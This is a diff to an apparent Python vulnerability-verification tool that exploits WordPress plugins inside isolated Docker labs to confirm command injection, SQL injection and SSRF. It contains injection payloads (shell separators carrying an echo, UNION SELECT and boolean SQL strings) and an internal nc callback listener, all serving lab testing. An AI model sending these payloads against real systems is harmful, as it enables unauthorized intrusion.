@@ -53,6 +53,11 @@ _ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
 _EMAIL_HINTS = ("email", "mail", "user_email")
 _PASS_HINTS = ("pass", "password", "pwd", "user_pass")
 _PATH_HINTS = ("file", "path", "page", "template", "include", "doc", "filename", "tpl", "view")
+_CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
+             "domain", "shell")
+_SQLI_HINTS = ("id", "search", "q", "query", "name", "term", "filter", "sort", "order")
+_URL_HINTS = ("url", "uri", "src", "source", "link", "feed", "webhook", "callback",
+             "image", "avatar", "file_url", "endpoint")
 
 
 @dataclass
@@ -228,6 +233,27 @@ class _Lab:
         r = self.sh("exec", "-i", self.wp, "sh", "-c", f"cat > {path}",
                     input_text=content, timeout=timeout)
         return r.returncode == 0
+
+    def start_listener(self, timeout: float = 30.0) -> Optional[str]:
+        """Levanta un contenedor 'callback' en la MISMA red Docker del laboratorio (no en el
+        host, no expuesto a internet) que solo escucha en TCP/8080 y vuelca cualquier conexion
+        entrante a un fichero. Sirve para confirmar SSRF: si el endpoint vulnerable hace de
+        verdad una peticion saliente hacia aqui (porque el SERVIDOR, no el navegador del
+        atacante, sigue una URL que el atacante controla), la conexion queda grabada con el
+        token unico que iba en la ruta -- prueba de la peticion saliente real, no una
+        suposicion por status code."""
+        self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
+        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
+                   "sh", "-c", "while true; do nc -l -p 8080 >> /var/log/ssrf.log 2>&1; done",
+                   timeout=timeout)
+        if r.returncode != 0:
+            return None
+        self._created.append(("container", self.listener))
+        return self.listener
+
+    def listener_log(self, timeout: float = 10.0) -> str:
+        r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
+        return (r.stdout or "") if r.returncode == 0 else ""
 
     def wp_cli(self, *args, timeout=120.0) -> subprocess.CompletedProcess:
         return self.sh("run", "--rm", "--network", self.net, "--platform", "linux/amd64",
@@ -906,6 +932,384 @@ def verify_wordpress_path_traversal(
                           f"ninguna devolvio el secreto plantado -- el traversal no se confirmo "
                           f"(puede necesitar otra profundidad de '../', otra codificacion, o el "
                           f"endpoint/parametro no son los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_command_injection(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, cmd_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica command/OS injection probando que el servidor remoto EVALUA aritmetica que nunca
+    se le mando literal: el payload pide `$(( a + b ))` para dos numeros aleatorios y, si la
+    respuesta contiene la SUMA (y la suma no aparece en ningun punto del payload enviado, solo
+    los dos operandos por separado), es prueba inequivoca de que un shell remoto ejecuto el
+    comando -- no una deduccion por status code ni por reflejo literal del input."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    cmd_param = cmd_param_hint or _pick_param(parameters, _CMD_HINTS)
+    if not cmd_param:
+        res.detail = "no se identifico el parametro que llega al comando del sistema"
+        res.limitations.append("la verificacion de command injection necesita saber que "
+                               "parametro llega al comando; afina 'parameters' en la hipotesis "
+                               "del LLM o pasalo a mano (cmd_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+        expected = a + b
+        calc = f"$(( {a} + {b} ))"
+        attempts = [
+            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}",
+            f"`echo {calc}`", f"$(echo {calc})", f"\necho {calc}\n",
+            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "', calc,
+        ]
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "cmd_param": cmd_param, "a": a, "b": b, "suma_esperada": expected,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[cmd_param] = payload_value
+            step(f"probando {m} {endpoint} con {cmd_param}={payload_value!r}...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            matched = bool(pattern.search(resp.text or ""))
+            tried.append({"payload": payload_value, "status": resp.status_code, "suma_presente": matched})
+            if matched:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: la respuesta contiene {expected} (={a}+{b}), calculado por un "
+                     f"shell remoto -- ese numero no aparece en el payload enviado.")
+                step("capturando pantalla: la respuesta HTTP con la suma calculada por el shell "
+                     "remoto (prueba final)...")
+                shot_url = (boot.base_url + endpoint
+                           + ("&" if "?" in endpoint else "?")
+                           + f"{cmd_param}={payload_value}") if m == "GET" else None
+                if shot_url:
+                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                           f"Paso 5: EJECUCION DE COMANDOS confirmada -- la respuesta contiene "
+                           f"{expected} (={a}+{b}), que solo pudo calcularse ejecutando aritmetica "
+                           f"en un shell remoto, no reflejando el payload enviado.",
+                           f"Step 5: COMMAND EXECUTION confirmed -- the response contains "
+                           f"{expected} (={a}+{b}), which could only come from arithmetic "
+                           f"evaluated by a remote shell, not from reflecting the sent payload.")
+                break
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
+                          f"{res.evidence['payload_ganador']!r} hizo que el servidor EJECUTARA "
+                          f"{a}+{b} y devolviera {expected} en la respuesta -- prueba inequivoca "
+                          f"de ejecucion remota de comandos (el payload enviado no contiene el "
+                          f"numero {expected} en ningun punto)")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de inyeccion para {cmd_param} y "
+                          f"ninguna produjo la suma esperada ({a}+{b}={expected}) en la respuesta "
+                          f"-- la inyeccion de comandos no se confirmo (puede necesitar otro "
+                          f"separador de comandos, otro shell, o el endpoint/parametro no son "
+                          f"los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_sqli(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, sqli_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica SQL injection con DOS tecnicas, de mas a menos dura:
+
+    1) UNION-based (prueba dura): fuerza bruta del numero de columnas (1-8) probando `version()`
+       en cada posicion; si una version REAL del motor (que no estaba en la respuesta base)
+       aparece en la respuesta, es dato extraido de verdad de la base de datos -- no una
+       deduccion.
+    2) boolean-blind diferencial (mas debil, solo si (1) no filtro nada): compara pares de
+       condiciones TRUE/FALSE inyectadas; se marca verificado solo si al menos 2 de 3 pares
+       muestran una diferencia de respuesta CONSISTENTE y el caso TRUE se comporta como la
+       peticion de control (para no confundir ruido normal con una condicion real). `detail`
+       deja explicito con cual de las dos tecnicas se confirmo, para que el analista sepa que
+       tan dura es la prueba."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
+    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
+    if not sqli_param:
+        res.detail = "no se identifico el parametro a inyectar"
+        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
+                               "'parameters' en la hipotesis del LLM o pasalo a mano "
+                               "(sqli_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
+        orig_value = str(base_params.get(sqli_param) or "1")
+
+        def send(val):
+            payload = dict(base_params)
+            payload[sqli_param] = val
+            return boot.sub_sess.request(m, boot.base_url + endpoint,
+                               data=payload if m != "GET" else None,
+                               params=payload if m == "GET" else None, timeout=20)
+
+        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
+                             "login_bajo_privilegio_password": boot.sub_pass,
+                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint})
+
+        step("peticion de control (sin inyeccion)...")
+        try:
+            base_resp = send(orig_value)
+        except Exception as e:
+            res.detail = f"la peticion de control fallo: {e}"
+            return res
+        base_len = len(base_resp.text or "")
+        version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
+
+        step("probando UNION-based (fuerza bruta de columnas) para extraer version() real...")
+        union_tried = []
+        union_found = None
+        for n in range(1, 9):
+            for pos in range(n):
+                cols = ["NULL"] * n
+                cols[pos] = "version()"
+                payload_val = f"{orig_value}' UNION SELECT {','.join(cols)}-- -"
+                try:
+                    r = send(payload_val)
+                except Exception as e:
+                    union_tried.append({"payload": payload_val, "error": str(e)})
+                    continue
+                new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                union_tried.append({"payload": payload_val, "status": r.status_code,
+                                    "version_nueva": sorted(new_versions)})
+                if new_versions:
+                    union_found = (payload_val, sorted(new_versions)[0], r)
+                    break
+            if union_found:
+                break
+
+        if union_found:
+            payload_val, mysql_version, r = union_found
+            res.verified = True
+            res.ok = True
+            res.evidence["tecnica"] = "union-based"
+            res.evidence["payload_ganador"] = payload_val
+            res.evidence["mysql_version_extraida"] = mysql_version
+            res.evidence["status_code_respuesta"] = r.status_code
+            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
+            res.evidence["union_intentos"] = union_tried
+            res.detail = (f"SQLI confirmada (UNION-based): la peticion con {sqli_param}=... hizo "
+                          f"que la base de datos devolviera su version real ({mysql_version}) "
+                          f"dentro de la respuesta -- version() nunca aparece en una respuesta "
+                          f"normal, es dato extraido de verdad, no una deduccion por diferencia "
+                          f"de contenido")
+            step(f"VERIFICADO (UNION-based): version real del motor filtrada en la respuesta: "
+                 f"{mysql_version}")
+            if m == "GET":
+                shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
+                           + f"{sqli_param}={payload_val}")
+                boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
+                       f"Paso 5: SQL INJECTION confirmada -- la respuesta contiene la version "
+                       f"real del motor de base de datos ({mysql_version}), extraida via UNION "
+                       f"SELECT.",
+                       f"Step 5: SQL INJECTION confirmed -- the response contains the database "
+                       f"engine's real version ({mysql_version}), extracted via UNION SELECT.")
+            res.evidence["screenshots"] = boot.shots
+            return res
+
+        res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
+                                                   f"ninguna filtro version()")
+
+        step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
+        pairs = [
+            (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
+            (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
+            (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+        ]
+        bool_tried = []
+        consistent_diffs = 0
+        for true_p, false_p in pairs:
+            try:
+                rt = send(true_p)
+                rf = send(false_p)
+            except Exception as e:
+                bool_tried.append({"true": true_p, "false": false_p, "error": str(e)})
+                continue
+            lt, lf = len(rt.text or ""), len(rf.text or "")
+            threshold = max(20, 0.05 * base_len)
+            differs = (rt.status_code != rf.status_code) or (abs(lt - lf) > threshold)
+            matches_base = abs(lt - base_len) <= threshold
+            bool_tried.append({"true": true_p, "false": false_p, "status_true": rt.status_code,
+                               "status_false": rf.status_code, "len_true": lt, "len_false": lf,
+                               "difiere": differs, "true_coincide_con_base": matches_base})
+            if differs and matches_base:
+                consistent_diffs += 1
+        res.evidence["boolean_intentos"] = bool_tried
+
+        if consistent_diffs >= 2:
+            res.verified = True
+            res.ok = True
+            res.evidence["tecnica"] = "boolean-blind-differential"
+            res.detail = (f"SQLI probable (boolean-blind, diferencial): {consistent_diffs}/"
+                          f"{len(pairs)} pares TRUE/FALSE mostraron una diferencia consistente de "
+                          f"respuesta (y el caso TRUE se comporto como la peticion de control) -- "
+                          f"indicio fuerte de inyeccion ciega, aunque sin dato extraido literal "
+                          f"(menos duro que el UNION-based)")
+            step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
+                 f"diferencia consistente")
+        else:
+            res.ok = True
+            res.detail = (f"UNION-based no filtro version() ({len(union_tried)} combinaciones) y "
+                          f"boolean-blind no mostro diferencia consistente ({consistent_diffs}/"
+                          f"{len(pairs)} pares) -- la inyeccion SQL no se confirmo")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red/volumen)...")
+        lab.teardown()
+
+
+def verify_wordpress_ssrf(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, url_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Verifica SSRF levantando un contenedor 'callback' en la MISMA red Docker del laboratorio
+    (no expuesto a internet, solo alcanzable desde dentro) y apuntando el parametro de URL/fichero
+    remoto que la hipotesis cita hacia el, con un TOKEN aleatorio en la ruta. Si el endpoint
+    vulnerable hace de verdad una peticion saliente, la conexion queda grabada en el log del
+    listener con ese token exacto -- prueba de que el SERVIDOR (no el navegador del atacante)
+    emitio la peticion, no una deduccion por status code o por tiempo de respuesta."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
+    if not url_param:
+        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
+        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
+                               "URL remota; afina 'parameters' en la hipotesis del LLM o pasalo "
+                               "a mano (url_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
+        listener = lab.start_listener()
+        if not listener:
+            res.detail = "no se pudo levantar el contenedor listener para SSRF"
+            return res
+
+        token = _token()
+        callback_url = f"http://{lab.listener}:8080/binoracle-ssrf-{token}"
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "url_param": url_param, "callback_url": callback_url, "token": token,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload[url_param] = callback_url
+        step(f"probando {m} {endpoint} con {url_param}={callback_url!r}...")
+        try:
+            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                               data=payload if m != "GET" else None,
+                               params=payload if m == "GET" else None, timeout=20)
+            res.evidence["status_code_respuesta"] = resp.status_code
+            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+        except Exception as e:
+            res.evidence["peticion_error"] = str(e)
+
+        step("esperando y leyendo el log del listener interno...")
+        time.sleep(3)
+        log = lab.listener_log()
+        res.evidence["listener_log_recorte"] = log[:1000]
+        hit = token in log
+
+        if hit:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"SSRF confirmado: el listener interno (inalcanzable desde fuera del "
+                          f"laboratorio) recibio una conexion con el token exacto "
+                          f"'binoracle-ssrf-{token}' tras la peticion con {url_param}="
+                          f"{callback_url!r} -- prueba de que el SERVIDOR emitio la peticion "
+                          f"saliente, no el navegador del atacante")
+            step(f"VERIFICADO: el listener interno recibio el token '{token}' -- la peticion "
+                 f"saliente la hizo el servidor.")
+        else:
+            res.ok = True
+            res.detail = (f"se envio la peticion con {url_param}={callback_url!r} pero el token "
+                          f"'{token}' no aparecio en el log del listener interno -- el SSRF no se "
+                          f"confirmo (puede que el endpoint/parametro no sean los reales, o que "
+                          f"el servidor filtre URLs internas antes de seguirlas)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
